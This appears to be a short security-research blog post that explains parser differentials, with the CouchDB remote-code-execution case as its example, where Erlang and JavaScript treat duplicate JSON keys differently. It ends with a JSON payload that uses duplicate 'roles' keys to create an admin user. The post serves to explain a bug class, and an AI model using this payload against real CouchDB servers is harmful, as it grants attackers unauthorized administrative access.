---
title: Parser Differentials - From Theory to RCE
date: 2024-01-15
categories:
  - Research
  - Parser Differential
---

## Definition

Parser differentials emerge when two (or more) parsers interpret the same input in different ways.

Source: A Survey of Parser Differential Anti-patterns

## What is it good for?

Unlike many other bug classes, the impact of Parser Differentials is very much context-dependent. We can find parser differentials without further context and stockpile them for later use.

## CouchDB RCE - Max Justicz

CouchDB is written in Erlang, but allows users to specify JavaScript. These scripts are automatically evaluated when a document is created or updated. They start in a new process and are passed JSON-serialized documents from the Erlang side.

### Example

**In Erlang (jiffy):**
```erlang
jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}")
% Returns: {[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}
```

**In JavaScript:**
```javascript
JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
% Returns: {foo: "baz"}
```

While the Erlang implementation yields both key-value pairs in an array, JavaScript only takes the last one.

### Fetching the value in Erlang

Using `couch_util:get_value`:
```erlang
lists:keysearch(Key, 1, List).
```

### Payload for creating an Admin User

```json
{
  "type": "user",
  "name": "oops",
  "roles": ["admin"],
  "roles": [],
  "password": "password"
}
```

Erlang sees `["admin"]` while JavaScript sees `[]`.
